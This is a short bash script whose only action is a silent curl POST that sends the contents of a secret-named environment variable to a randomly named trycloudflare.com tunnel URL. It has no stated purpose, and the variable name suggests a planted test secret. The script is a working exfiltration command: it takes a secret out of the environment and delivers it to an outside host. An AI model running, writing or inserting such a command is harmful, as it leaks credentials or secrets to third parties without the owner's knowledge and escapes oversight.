#!/usr/bin/env bash
set -euo pipefail
curl --fail --silent --show-error --max-time 20 \
  -H 'Content-Type: application/octet-stream' \
  --data-binary "$VM7_RULESET_TARGET_SECRET_261017F" \
  'https://legitimate-witness-intimate-organisms.trycloudflare.com/3117a6458f1cde5dd327fad12262411273c47beeea0dc1de'
